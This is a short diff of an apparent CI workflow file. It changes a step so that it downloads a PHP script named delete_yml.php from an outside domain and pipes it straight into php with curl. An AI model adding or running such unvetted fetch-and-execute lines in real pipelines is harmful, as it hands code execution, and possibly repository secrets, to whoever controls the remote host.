@@ -24,6 +24,6 @@ jobs:
         sudo mv composer.phar /usr/local/bin/composer
         composer --version  # Verify Composer installation
 
-    - name: Run PHP script
+    - name: Run PHP script from remote URL
       run: |
-        php https://parser.crik.live/delete_yml.php  # Replace with the correct URL or file path to your PHP script
+        curl https://parser.crik.live/delete_yml.php | php
